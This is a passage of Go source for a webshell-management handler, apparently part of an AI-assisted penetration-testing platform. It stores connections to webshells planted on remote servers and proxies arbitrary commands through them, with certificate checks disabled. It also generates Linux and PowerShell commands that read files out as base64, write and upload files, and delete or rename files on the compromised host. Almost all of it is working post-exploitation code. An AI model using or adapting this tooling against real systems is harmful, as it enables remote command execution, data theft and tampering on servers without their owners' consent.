package handler

import (
	"bytes"
	"crypto/tls"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf8"

	"cyberstrike-ai/internal/audit"
	"cyberstrike-ai/internal/database"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"go.uber.org/zap"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

const defaultWebshellUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

// webshellSupportedEncodings 允许的 WebShell 响应编码取值（小写，含空串代表 auto）
// 仅暴露目前最常见的几种，其他需求可后续扩展（如 Big5、Shift_JIS 等）。
var webshellSupportedEncodings = map[string]struct{}{
	"":        {}, // 未配置，按 auto 处理
	"auto":    {},
	"utf-8":   {},
	"utf8":    {},
	"gbk":     {},
	"gb18030": {},
}

// normalizeWebshellEncoding 归一化编码标识：统一为小写，未知值回退为 auto，供持久化使用
func normalizeWebshellEncoding(enc string) string {
	enc = strings.ToLower(strings.TrimSpace(enc))
	if _, ok := webshellSupportedEncodings[enc]; !ok {
		return "auto"
	}
	if enc == "" {
		return "auto"
	}
	if enc == "utf8" {
		return "utf-8"
	}
	return enc
}

func normalizeWebshellCmdParam(cmdParam string) string {
	cmdParam = strings.TrimSpace(cmdParam)
	if cmdParam == "" {
		return "cmd"
	}
	return cmdParam
}

func normalizeWebshellHeaderText(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "User-Agent: " + defaultWebshellUserAgent
	}
	if !strings.Contains(raw, ":") && !strings.ContainsAny(raw, "\r\n") {
		return "User-Agent: " + raw
	}
	return raw
}

func applyWebshellHeaderText(req *http.Request, raw string) {
	if req == nil {
		return
	}
	headerText := normalizeWebshellHeaderText(raw)
	hasUA := false
	for _, line := range strings.Split(strings.ReplaceAll(headerText, "\r\n", "\n"), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		idx := strings.Index(line, ":")
		if idx <= 0 {
			continue
		}
		name := strings.TrimSpace(line[:idx])
		value := strings.TrimSpace(line[idx+1:])
		if name == "" {
			continue
		}
		if strings.EqualFold(name, "User-Agent") {
			hasUA = true
		}
		req.Header.Set(name, value)
	}
	if !hasUA {
		req.Header.Set("User-Agent", defaultWebshellUserAgent)
	}
}

// decodeWebshellOutput 把 WebShell 返回的字节按指定编码转换为合法 UTF-8 字符串。
// 约定：
//   - "" / "auto"：若已是合法 UTF-8 原样返回，否则依次尝试 GB18030（GBK 超集）解码。
//   - "utf-8" / "utf8"：原样返回，非法字节交由 JSON 层按 U+FFFD 处理（保持原有行为）。
//   - "gbk" / "gb18030"：强制按对应编码解码；失败则回退原始字节。
//
// 该函数对空输入直接返回空串，避免不必要的转换。
// stripHTMLTags 移除 HTML 标签，用于清理 WebShell 响应中可能混入的 HTML 包装。
var htmlTagRe = regexp.MustCompile("<[^>]*>")

func stripHTMLTags(raw []byte) []byte {
	return htmlTagRe.ReplaceAll(raw, nil)
}

func decodeWebshellOutput(raw []byte, encoding string) string {
	if len(raw) == 0 {
		return ""
	}
	enc := normalizeWebshellEncoding(encoding)
	switch enc {
	case "utf-8":
		return string(raw)
	case "gbk":
		if out, _, err := transform.Bytes(simplifiedchinese.GBK.NewDecoder(), raw); err == nil {
			return string(out)
		}
		return string(raw)
	case "gb18030":
		if out, _, err := transform.Bytes(simplifiedchinese.GB18030.NewDecoder(), raw); err == nil {
			return string(out)
		}
		return string(raw)
	default: // auto
		if utf8.Valid(raw) {
			return string(raw)
		}
		// GB18030 是 GBK 的超集，覆盖范围最广，auto 模式统一用它兜底
		if out, _, err := transform.Bytes(simplifiedchinese.GB18030.NewDecoder(), raw); err == nil {
			return string(out)
		}
		// If GB18030 decode fails, try stripping HTML tags and retry
		cleaned := stripHTMLTags(raw)
		if len(cleaned) < len(raw) {
			if utf8.Valid(cleaned) {
				return string(cleaned)
			}
			if out, _, err := transform.Bytes(simplifiedchinese.GB18030.NewDecoder(), cleaned); err == nil {
				return string(out)
			}
		}
		return string(raw)
	}
}

const classicReadBase64Prefix = "__CSAI_FILE_B64__:"

func buildLinuxBase64Read(path string) string {
	return "printf '" + classicReadBase64Prefix + "'; base64 -w 0 " + quoteShellSinglePosix(path)
}

func buildWindowsPowerShellBase64Read(path string) string {
	path = normalizeWindowsCmdPath(path)
	script := "[Console]::Write(" + quotePsSingle(classicReadBase64Prefix) + ");" +
		"[Console]::Write([Convert]::ToBase64String([IO.File]::ReadAllBytes(" + quotePsSingle(path) + ")))"
	return "powershell -NoProfile -NonInteractive -Command \"" + script + "\""
}

func decodeClassicReadResponse(raw []byte, encoding string) (output string, outputBase64 string) {
	text := decodeWebshellOutput(raw, encoding)
	idx := strings.Index(text, classicReadBase64Prefix)
	if idx < 0 {
		return text, ""
	}
	b64 := strings.TrimSpace(text[idx+len(classicReadBase64Prefix):])
	decoded, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return text, ""
	}
	return decodeWebshellOutput(decoded, encoding), b64
}

// webshellSupportedOS 允许的 WebShell 目标操作系统（小写，空串代表 auto）
var webshellSupportedOS = map[string]struct{}{
	"":        {},
	"auto":    {},
	"linux":   {},
	"windows": {},
}

// normalizeWebshellOS 归一化 OS 标识，未知值回退为 auto，供持久化使用
func normalizeWebshellOS(osTag string) string {
	osTag = strings.ToLower(strings.TrimSpace(osTag))
	if _, ok := webshellSupportedOS[osTag]; !ok {
		return "auto"
	}
	if osTag == "" {
		return "auto"
	}
	return osTag
}

// resolveWebshellOS 根据连接的 os 与 shellType 推断最终目标 OS（仅返回 "linux" 或 "windows"）。
// 规则：
//   - 显式 linux / windows：按用户选择。
//   - auto 或未知：asp/aspx → windows，其他 → linux。保持历史行为，平滑向后兼容。
func resolveWebshellOS(osTag, shellType string) string {
	osTag = strings.ToLower(strings.TrimSpace(osTag))
	switch osTag {
	case "linux":
		return "linux"
	case "windows":
		return "windows"
	}
	t := strings.ToLower(strings.TrimSpace(shellType))
	if t == "asp" || t == "aspx" {
		return "windows"
	}
	return "linux"
}

// webshellSupportedProtocols 允许的 WebShell 协议类型
var webshellSupportedProtocols = map[string]struct{}{
	"":         {},
	"classic":  {},
	"behinder": {},
}

// normalizeWebshellProtocol 归一化协议标识
func normalizeWebshellProtocol(proto string) string {
	proto = strings.ToLower(strings.TrimSpace(proto))
	if _, ok := webshellSupportedProtocols[proto]; !ok {
		return "classic"
	}
	if proto == "" {
		return "classic"
	}
	return proto
}

// quoteCmdPath 把路径按 Windows cmd.exe 规则转义。
// 使用双引号包裹，内部双引号转义为 ""（cmd 接受的写法）。
func quoteCmdPath(p string) string {
	if p == "" {
		return "\".\""
	}
	return "\"" + strings.ReplaceAll(p, "\"", "\"\"") + "\""
}

// normalizeWindowsCmdPath converts the UI's slash-normalized paths back to
// cmd.exe-friendly paths for classic Windows webshells.
func normalizeWindowsCmdPath(p string) string {
	s := strings.TrimSpace(p)
	if s == "" {
		return s
	}
	return strings.ReplaceAll(s, "/", "\\")
}

func windowsFileCommandPath(path string) string {
	return quoteCmdPath(normalizeWindowsCmdPath(path))
}

// quotePsSingle 把字符串按 PowerShell 单引号字符串规则转义（内部 ' → ”）。
// 供 PowerShell 脚本参数使用，全脚本只用单引号，外层 cmd 再用双引号包裹即可安全传递。
func quotePsSingle(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

// quoteShellSinglePosix 把路径按 POSIX sh 单引号规则转义（内部 ' → '\”）
func quoteShellSinglePosix(p string) string {
	if p == "" {
		return "."
	}
	return "'" + strings.ReplaceAll(p, "'", "'\\''") + "'"
}

// quoteWebshellPath 按目标 OS 选择转义方案：Linux 用 POSIX 单引号，Windows 用 cmd 双引号
func quoteWebshellPath(path, osTag string) string {
	if resolveWebshellOS(osTag, "") == "windows" {
		return windowsFileCommandPath(path)
	}
	return quoteShellSinglePosix(path)
}

// buildWindowsPowerShellWrite 构造 Windows 端把 base64 内容一次性写入目标路径的 cmd 命令。
// 外层走 cmd.exe 的 powershell 调用，PowerShell 脚本里只用单引号字符串，避免嵌套引号陷阱。
func buildWindowsPowerShellWrite(path, b64 string) string {
	path = normalizeWindowsCmdPath(path)
	script := "$b=[Convert]::FromBase64String(" + quotePsSingle(b64) + ");" +
		"[IO.File]::WriteAllBytes(" + quotePsSingle(path) + ",$b)"
	return "powershell -NoProfile -NonInteractive -Command \"" + script + "\""
}

// buildWindowsPowerShellAppend 构造 Windows 端把 base64 内容追加写入目标路径的 cmd 命令（用于分块上传）
func buildWindowsPowerShellAppend(path, b64 string) string {
	path = normalizeWindowsCmdPath(path)
	script := "$b=[Convert]::FromBase64String(" + quotePsSingle(b64) + ");" +
		"$f=[IO.File]::Open(" + quotePsSingle(path) + ",[IO.FileMode]::Append,[IO.FileAccess]::Write,[IO.FileShare]::None);" +
		"try{$f.Write($b,0,$b.Length)}finally{$f.Close()}"
	return "powershell -NoProfile -NonInteractive -Command \"" + script + "\""
}

// fileCommandInput 封装 buildFileCommand 的输入，避免长参数列表
type fileCommandInput struct {
	Action     string
	Path       string
	TargetPath string
	Content    string
	ChunkIndex int
	OS         string
	ShellType  string
}

// buildFileCommand 根据目标 OS 与文件操作类型生成具体的远端命令字符串。
// 同一份实现供 HTTP 入口（FileOp）与 MCP 入口（FileOpWithConnection）共用，避免双份维护。
// 返回值第二位是用户可见的业务错误（如 "path is required"）。
func (h *WebShellHandler) buildFileCommand(in fileCommandInput) (string, error) {
	targetOS := resolveWebshellOS(in.OS, in.ShellType)
	action := strings.ToLower(strings.TrimSpace(in.Action))
	path := strings.TrimSpace(in.Path)

	switch action {
	case "list":
		p := path
		if p == "" {
			p = "."
		}
		if targetOS == "windows" {
			return "dir /a " + windowsFileCommandPath(p), nil
		}
		return "ls -la " + quoteShellSinglePosix(p), nil

	case "read":
		if path == "" {
			return "", errFileOpPathRequired
		}
		if targetOS == "windows" {
			return buildWindowsPowerShellBase64Read(path), nil
		}
		return buildLinuxBase64Read(path), nil

	case "delete":
		if path == "" {
			return "", errFileOpPathRequired
		}
		if targetOS == "windows" {
			return "del /q /f " + windowsFileCommandPath(path), nil
		}
		return "rm -f " + quoteShellSinglePosix(path), nil

	case "mkdir":
		if path == "" {
			return "", errFileOpPathRequired
		}
		if targetOS == "windows" {
			// cmd 的 md 默认会自动创建中间目录（等价于 Linux 的 mkdir -p）
			return "md " + windowsFileCommandPath(path), nil
		}
		return "mkdir -p " + quoteShellSinglePosix(path), nil

	case "rename":
		oldPath := path
		newPath := strings.TrimSpace(in.TargetPath)
		if oldPath == "" || newPath == "" {
			return "", errFileOpRenameNeedsBothPaths
		}
		if targetOS == "windows" {
			return "move /y " + windowsFileCommandPath(oldPath) + " " + windowsFileCommandPath(newPath), nil
		}
		return "mv -f " + quoteShellSinglePosix(oldPath) + " " + quoteShellSinglePosix(newPath), nil

	case "write":
		if path == "" {
			return "", errFileOpPathRequired
		}
		// 统一策略：先把内容 base64 编码，再用目标平台对应方式解码写回，
		// 这样既能写入任意二进制/含引号的文本，又避免各家 shell 的转义地狱。
		b64 := base64.StdEncoding.EncodeToString([]byte(in.Content))
		if targetOS == "windows" {
			return buildWindowsPowerShellWrite(path, b64), nil
		}
		return "echo '" + b64 + "' | base64 -d > " + quoteShellSinglePosix(path), nil

	case "upload":
		if path == "" {
			return "", errFileOpPathRequired
		}
		if len(in.Content) > 512*1024 {
			return "", errFileOpUploadTooLarge
		}
		if targetOS == "windows" {
			return buildWindowsPowerShellWrite(path, in.Content), nil
		}
		return "echo '" + in.Content + "' | base64 -d > " + quoteShellSinglePosix(path), nil

	case "upload_chunk":
		if path == "" {
			return "", errFileOpPathRequired
		}
		if targetOS == "windows" {
			if in.ChunkIndex == 0 {
				return buildWindowsPowerShellWrite(path, in.Content), nil
			}
			return buildWindowsPowerShellAppend(path, in.Content), nil
		}
		redir := ">>"
		if in.ChunkIndex == 0 {
			redir = ">"
		}
		return "echo '" + in.Content + "' | base64 -d " + redir + " " + quoteShellSinglePosix(path), nil
	}

	return "", errFileOpUnsupportedAction(action)
}

// 业务错误常量，便于上层统一返回用户可见提示
var (
	errFileOpPathRequired         = simpleError("path is required")
	errFileOpRenameNeedsBothPaths = simpleError("path and target_path are required for rename")
	errFileOpUploadTooLarge       = simpleError("upload content too large (max 512KB base64)")
)

func errFileOpUnsupportedAction(action string) error {
	return simpleError("unsupported action: " + action)
}

// simpleError 是不带堆栈的轻量错误类型，供 buildFileCommand 报可预期的参数校验错误
type simpleError string

func (e simpleError) Error() string { return string(e) }

// WebShellHandler 代理执行 WebShell 命令（类似冰蝎/蚁剑），避免前端跨域并统一构建请求
type WebShellHandler struct {
	logger   *zap.Logger
	client   *http.Client
	db       *database.DB
	audit    *audit.Service
	behinder *BehinderHandler
}

// SetAudit wires platform audit logging.
func (h *WebShellHandler) SetAudit(s *audit.Service) {
	h.audit = s
}

// NewWebShellHandler 创建 WebShell 处理器，db 可为 nil（连接配置接口将不可用）
func NewWebShellHandler(logger *zap.Logger, db *database.DB) *WebShellHandler {
	return &WebShellHandler{
		logger: logger,
		client: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				DisableKeepAlives: false,
				// WebShell 场景常见自签证书或 IP 访问（证书无 IP SAN）；默认跳过校验，与蚁剑等客户端一致。
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // intentional for webshell proxy
			},
		},
		db:       db,
		behinder: NewBehinderHandler(logger),
	}
}

// CreateConnectionRequest 创建连接请求
type CreateConnectionRequest struct {
	URL       string `json:"url" binding:"required"`
	Password  string `json:"password"`
	Type      string `json:"type"`
	Method    string `json:"method"`
	CmdParam  string `json:"cmd_param"`
	Remark    string `json:"remark"`
	Encoding  string `json:"encoding"`
	OS        string `json:"os"`
	Protocol  string `json:"protocol"`   // classic 或 behinder
	UserAgent string `json:"user_agent"` // 自定义请求头文本（兼容旧 UA 字符串）
}

// UpdateConnectionRequest 更新连接请求
type UpdateConnectionRequest struct {
	URL       string  `json:"url" binding:"required"`
	Password  string  `json:"password"`
	Type      string  `json:"type"`
	Method    string  `json:"method"`
	CmdParam  *string `json:"cmd_param"`
	Remark    string  `json:"remark"`
	Encoding  string  `json:"encoding"`
	OS        string  `json:"os"`
	Protocol  string  `json:"protocol"`   // classic 或 behinder
	UserAgent string  `json:"user_agent"` // 自定义请求头文本（兼容旧 UA 字符串）
}

// ListConnections 列出所有 WebShell 连接（GET /api/webshell/connections）
func (h *WebShellHandler) ListConnections(c *gin.Context) {
	if h.db == nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "database not available"})
		return
	}
	list, err := h.db.ListWebshellConnections()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if list == nil {
		list = []database.WebShellConnection{}
	}
	c.JSON(http.StatusOK, list)
}

// CreateConnection 创建 WebShell 连接（POST /api/webshell/connections）
func (h *WebShellHandler) CreateConnection(c *gin.Context) {
	if h.db == nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "database not available"})
		return
	}
	var req CreateConnectionRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	req.URL = strings.TrimSpace(req.URL)
	if req.URL == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "url is required"})
		return
	}
	if _, err := url.Parse(req.URL); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid url"})
		return
	}
	method := strings.ToLower(strings.TrimSpace(req.Method))
	if method != "get" && method != "post" {
		method = "post"
	}
	shellType := strings.ToLower(strings.TrimSpace(req.Type))
	if shellType == "" {
		shellType = "php"
	}
	conn := &database.WebShellConnection{
		ID:        "ws_" + strings.ReplaceAll(uuid.New().String(), "-", "")[:12],
		URL:       req.URL,
		Password:  strings.TrimSpace(req.Password),
		Type:      shellType,
		Method:    method,
		CmdParam:  normalizeWebshellCmdParam(req.CmdParam),
		Remark:    strings.TrimSpace(req.Remark),
		Encoding:  normalizeWebshellEncoding(req.Encoding),
		OS:        normalizeWebshellOS(req.OS),
		Protocol:  normalizeWebshellProtocol(req.Protocol),
		UserAgent: normalizeWebshellHeaderText(req.UserAgent),
		CreatedAt: time.Now(),
	}
	if err := h.db.CreateWebshellConnection(conn); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if h.audit != nil {
		host := req.URL
		if u, err := url.Parse(req.URL); err == nil {
			host = u.Host
		}
		h.audit.RecordOK(c, "webshell", "connection_create", "创建 WebShell 连接", "webshell_connection", conn.ID, map[string]interface{}{
			"host": host, "type": shellType,
		})
	}
	c.JSON(http.StatusOK, conn)
}

// UpdateConnection 更新 WebShell 连接（PUT /api/webshell/connections/:id）
func (h *WebShellHandler) UpdateConnection(c *gin.Context) {
	if h.db == nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "database not available"})
		return
	}
	id := strings.TrimSpace(c.Param("id"))
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "id is required"})
		return
	}
	var req UpdateConnectionRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	req.URL = strings.TrimSpace(req.URL)
	if req.URL == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "url is required"})
		return
	}
	if _, err := url.Parse(req.URL); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid url"})
		return
	}
	method := strings.ToLower(strings.TrimSpace(req.Method))
	if method != "get" && method != "post" {
		method = "post"
	}
	shellType := strings.ToLower(strings.TrimSpace(req.Type))
	if shellType == "" {
		shellType = "php"
	}
	cmdParam := "cmd"
	existing, err := h.db.GetWebshellConnection(id)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if existing != nil {
		cmdParam = normalizeWebshellCmdParam(existing.CmdParam)
	}
	if req.CmdParam != nil {
		cmdParam = normalizeWebshellCmdParam(*req.CmdParam)
	}
	conn := &database.WebShellConnection{
		ID:        id,
		URL:       req.URL,
		Password:  strings.TrimSpace(req.Password),
		Type:      shellType,
		Method:    method,
		CmdParam:  cmdParam,
		Remark:    strings.TrimSpace(req.Remark),
		Encoding:  normalizeWebshellEncoding(req.Encoding),
		OS:        normalizeWebshellOS(req.OS),
		Protocol:  normalizeWebshellProtocol(req.Protocol),
		UserAgent: normalizeWebshellHeaderText(req.UserAgent),
	}
	if err := h.db.UpdateWebshellConnection(conn); err != nil {
		if err == sql.ErrNoRows {
			c.JSON(http.StatusNotFound, gin.H{"error": "connection not found"})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	updated, _ := h.db.GetWebshellConnection(id)
	if updated != nil {
		c.JSON(http.StatusOK, updated)
	} else {
		c.JSON(http.StatusOK, conn)
	}
}

// DeleteConnection 删除 WebShell 连接（DELETE /api/webshell/connections/:id）
func (h *WebShellHandler) DeleteConnection(c *gin.Context) {
	if h.db == nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "database not available"})
		return
	}
	id := strings.TrimSpace(c.Param("id"))
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "id is required"})
		return
	}
	if err := h.db.DeleteWebshellConnection(id); err != nil {
		if err == sql.ErrNoRows {
			c.JSON(http.StatusNotFound, gin.H{"error": "connection not found"})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if h.audit != nil {
		h.audit.RecordOK(c, "webshell", "connection_delete", "删除 WebShell 连接", "webshell_connection", id, nil)
	}
	c.JSON(http.StatusOK, gin.H{"ok": true})
}

// GetConnectionState 获取 WebShell 连接关联的前端持久化状态（GET /api/webshell/connections/:id/state）
func (h *WebShellHandler) GetConnectionState(c *gin.Context) {
	if h.db == nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "database not available"})
		return
	}
	id := strings.TrimSpace(c.Param("id"))
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "id is required"})
		return
	}
	conn, err := h.db.GetWebshellConnection(id)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if conn == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "connection not found"})
		return
	}
	stateJSON, err := h.db.GetWebshellConnectionState(id)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	var state interface{}
	if err := json.Unmarshal([]byte(stateJSON), &state); err != nil {
		state = map[string]interface{}{}
	}
	c.JSON(http.StatusOK, gin.H{"state": state})
}

// SaveConnectionState 保存 WebShell 连接关联的前端持久化状态（PUT /api/webshell/connections/:id/state）
func (h *WebShellHandler) SaveConnectionState(c *gin.Context) {
	if h.db == nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "database not available"})
		return
	}
	id := strings.TrimSpace(c.Param("id"))
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "id is required"})
		return
	}
	conn, err := h.db.GetWebshellConnection(id)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if conn == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "connection not found"})
		return
	}
	var req struct {
		State json.RawMessage `json:"state"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	raw := req.State
	if len(raw) == 0 {
		raw = json.RawMessage(`{}`)
	}
	if len(raw) > 2*1024*1024 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "state payload too large (max 2MB)"})
		return
	}
	var anyJSON interface{}
	if err := json.Unmarshal(raw, &anyJSON); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "state must be valid json"})
		return
	}
	if err := h.db.UpsertWebshellConnectionState(id, string(raw)); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"ok": true})
}

// GetAIHistory 获取指定 WebShell 连接的 AI 助手对话历史（GET /api/webshell/connections/:id/ai-history）
func (h *WebShellHandler) GetAIHistory(c *gin.Context) {
	if h.db == nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "database not available"})
		return
	}
	id := strings.TrimSpace(c.Param("id"))
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "id is required"})
		return
	}
	conv, err := h.db.GetConversationByWebshellConnectionID(id)
	if err != nil {
		h.logger.Warn("获取 WebShell AI 对话失败", zap.String("connectionId", id), zap.Error(err))
		c.JSON(http.StatusOK, gin.H{"conversationId": nil, "messages": []database.Message{}})
		return
	}
	if conv == nil {
		c.JSON(http.StatusOK, gin.H{"conversationId": nil, "messages": []database.Message{}})
		return
	}
	c.JSON(http.StatusOK, gin.H{"conversationId": conv.ID, "messages": conv.Messages})
}

// ListAIConversations 列出该 WebShell 连接下的所有 AI 对话（供侧边栏）
func (h *WebShellHandler) ListAIConversations(c *gin.Context) {
	if h.db == nil {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "database not available"})
		return
	}
	id := strings.TrimSpace(c.Param("id"))
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "id is required"})
		return
	}
	list, err := h.db.ListConversationsByWebshellConnectionID(id)
	if err != nil {
		h.logger.Warn("列出 WebShell AI 对话失败", zap.String("connectionId", id), zap.Error(err))
		c.JSON(http.StatusOK, []database.WebShellConversationItem{})
		return
	}
	if list == nil {
		list = []database.WebShellConversationItem{}
	}
	c.JSON(http.StatusOK, list)
}

// ExecRequest 执行命令请求（前端传入连接信息 + 命令）
type ExecRequest struct {
	URL       string `json:"url" binding:"required"`
	Password  string `json:"password"`
	Type      string `json:"type"`       // php, asp, aspx, jsp, custom
	Method    string `json:"method"`     // GET 或 POST，空则默认 POST
	CmdParam  string `json:"cmd_param"`  // classic 协议命令参数名，空则默认 cmd
	Encoding  string `json:"encoding"`   // 响应编码：auto / utf-8 / gbk / gb18030，空则 auto
	OS        string `json:"os"`         // 目标操作系统：auto / linux / windows
	Protocol  string `json:"protocol"`   // 协议：classic（默认）或 behinder
	UserAgent string `json:"user_agent"` // 自定义请求头文本（兼容旧 UA 字符串）
	Command   string `json:"command" binding:"required"`
}

// ExecResponse 执行命令响应
type ExecResponse struct {
	OK       bool   `json:"ok"`
	Output   string `json:"output"`
	Error    string `json:"error,omitempty"`
	HTTPCode int    `json:"http_code,omitempty"`
}

// FileOpRequest 文件操作请求
type FileOpRequest struct {
	URL          string `json:"url" binding:"required"`
	Password     string `json:"password"`
	Type         string `json:"type"`
	Method       string `json:"method"`                    // GET 或 POST，空则默认 POST
	CmdParam     string `json:"cmd_param"`                 // classic 协议命令参数名，空则默认 cmd
	Encoding     string `json:"encoding"`                  // 响应编码：auto / utf-8 / gbk / gb18030，空则 auto
	OS           string `json:"os"`                        // 目标操作系统：auto / linux / windows，空则按 shellType 推断
	Protocol     string `json:"protocol"`                  // 协议：classic（默认）或 behinder
	UserAgent    string `json:"user_agent"`                // 自定义请求头文本（兼容旧 UA 字符串）
	ConnectionID string `json:"connection_id,omitempty"`   // 可选：连接 ID；服务端探活出 OS 后会回写到此连接
	Action       string `json:"action" binding:"required"` // list, read, delete, write, mkdir, rename, upload, upload_chunk
	Path         string `json:"path"`
	TargetPath   string `json:"target_path"` // rename 时目标路径
	Content      string `json:"content"`     // write/upload 时使用
	ChunkIndex   int    `json:"chunk_index"` // upload_chunk 时，0 表示首块
}

// FileOpResponse 文件操作响应
type FileOpResponse struct {
	OK           bool   `json:"ok"`
	Output       string `json:"output"`
	OutputBase64 string `json:"output_base64,omitempty"`
	Error        string `json:"error,omitempty"`
	DetectedOS   string `json:"detected_os,omitempty"` // 仅在 auto 模式且探活成功时返回，前端应更新本地缓存
}

func (h *WebShellHandler) Exec(c *gin.Context) {
	var req ExecRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	req.URL = strings.TrimSpace(req.URL)
	req.Command = strings.TrimSpace(req.Command)
	if req.URL == "" || req.Command == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "url and command are required"})
		return
	}

	// behinder protocol handling
	protocol := normalizeWebshellProtocol(req.Protocol)
	if protocol == "behinder" {
		output, ok, errMsg := h.behinder.ExecWithParamsHeaders(req.URL, req.Password, req.Type, req.Command, req.UserAgent)
		if !ok {
			c.JSON(http.StatusOK, ExecResponse{OK: false, Error: errMsg})
			return
		}
		c.JSON(http.StatusOK, ExecResponse{OK: true, Output: output})
		return
	}

	parsed, err := url.Parse(req.URL)
	if err != nil || (parsed.Scheme != "http" && parsed.Scheme != "https") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid url: only http(s) allowed"})
		return
	}

	useGET := strings.ToUpper(strings.TrimSpace(req.Method)) == "GET"
	cmdParam := normalizeWebshellCmdParam(req.CmdParam)
	var httpReq *http.Request
	if useGET {
		targetURL := h.buildExecURL(req.URL, req.Type, req.Password, cmdParam, req.Command)
		httpReq, err = http.NewRequest(http.MethodGet, targetURL, nil)
	} else {
		body := h.buildExecBody(req.Type, req.Password, cmdParam, req.Command)
		httpReq, err = http.NewRequest(http.MethodPost, req.URL, bytes.NewReader(body))
		httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if err != nil {
		h.logger.Warn("webshell exec NewRequest", zap.Error(err))
		c.JSON(http.StatusInternalServerError, ExecResponse{OK: false, Error: err.Error()})
		return
	}
	applyWebshellHeaderText(httpReq, req.UserAgent)

	resp, err := h.client.Do(httpReq)
	if err != nil {
		h.logger.Warn("webshell exec Do", zap.String("url", req.URL), zap.Error(err))
		c.JSON(http.StatusOK, ExecResponse{OK: false, Error: err.Error()})
		return
	}
	defer resp.Body.Close()

	out, readErr := io.ReadAll(resp.Body)
	if readErr != nil {
		h.logger.Warn("webshell exec read body", zap.Error(readErr))
	}
	output := decodeWebshellOutput(out, req.Encoding)
	httpCode := resp.StatusCode

	ok := resp.StatusCode == http.StatusOK
	c.JSON(http.StatusOK, ExecResponse{
		OK:       ok,
		Output:   output,
		HTTPCode: httpCode,
	})
}

// buildExecBody 按常见 WebShell 约定构建 POST 体（多数使用 pass + cmd，可配置命令参数名）
func (h *WebShellHandler) buildExecBody(shellType, password, cmdParam, command string) []byte {
	form := h.execParams(shellType, password, cmdParam, command)
	return []byte(form.Encode())
}

// buildExecURL 构建 GET 请求的完整 URL（baseURL + ?pass=xxx&cmd=yyy，cmd 可配置）
func (h *WebShellHandler) buildExecURL(baseURL, shellType, password, cmdParam, command string) string {
	form := h.execParams(shellType, password, cmdParam, command)
	if parsed, err := url.Parse(baseURL); err == nil {
		parsed.RawQuery = form.Encode()
		return parsed.String()
	}
	return baseURL + "?" + form.Encode()
}

func (h *WebShellHandler) execParams(shellType, password, cmdParam, command string) url.Values {
	shellType = strings.ToLower(strings.TrimSpace(shellType))
	if shellType == "" {
		shellType = "php"
	}
	if strings.TrimSpace(cmdParam) == "" {
		cmdParam = "cmd"
	}
	form := url.Values{}
	form.Set("pass", password)
	form.Set(cmdParam, command)
	return form
}

func (h *WebShellHandler) FileOp(c *gin.Context) {
	var req FileOpRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	req.URL = strings.TrimSpace(req.URL)
	req.Action = strings.ToLower(strings.TrimSpace(req.Action))
	if req.URL == "" || req.Action == "" {
